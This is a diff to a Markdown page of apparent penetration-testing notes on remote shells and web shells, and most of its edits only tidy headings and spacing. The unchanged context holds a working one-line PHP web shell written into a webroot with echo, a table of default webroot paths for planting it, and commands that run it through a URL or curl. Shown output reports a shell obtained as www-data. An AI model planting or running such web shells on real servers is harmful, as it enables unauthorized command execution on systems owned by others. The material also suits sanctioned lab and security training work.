@@ -189,9 +189,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data) # server response
 We <mark style="color:green;">successfully</mark> got a remote shell on the target machine. If it isn't an unstable and "featureless" terminal, we can upgrade to a full TTY as in the [Reverse shells paragraph](setting-up-shells.md#id-1.-reverse-shells).
 {% endhint %}
 
-## Web Shells:
+## Web Shells
 
-### Preparing the shell script:
+For more Web Shell techniques and scripts, have a look at [this](setting-up-shells.md#web-shells).
+
+### Preparing the file
 
 {% tabs %}
 {% tab title="PHP" %}
@@ -213,7 +215,7 @@ We <mark style="color:green;">successfully</mark> got a remote shell on the targ
 {% endtab %}
 {% endtabs %}
 
-### Injecting to the webroot:
+### Injecting to the webroot
 
 <table><thead><tr><th>Web Server</th><th align="center">Default Webroot</th><th data-hidden align="center"></th></tr></thead><tbody><tr><td>Apache</td><td align="center">/var/www/html/</td><td align="center"></td></tr><tr><td>Nginx</td><td align="center">/usr/local/nginx/html/</td><td align="center"></td></tr><tr><td>IIS</td><td align="center">c:\inetpub\wwwroot\</td><td align="center"></td></tr><tr><td>XAMPP</td><td align="center">C:\xampp\htdocs\</td><td align="center"></td></tr></tbody></table>
 
@@ -223,10 +225,10 @@ We can check these directories to see which webroot is in use and then use `echo
 $ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ```
 
-### Execution:
+### Execution
 
 1. Visit the shell.php page on the compromised website, and use `?cmd=id` to execute the `id` command:\
    `http://SERVER_IP:PORT/shell.php?cmd=id`\
    We'll get the result of the `id` command on the web page!&#x20;
-2. Or Use `curl` command: `$ curl http://SERVER_IP:PORT/shell.php?cmd=id`
+2. Or Use `curl` command:`$ curl http://SERVER_IP:PORT/shell.php?cmd=id`
 
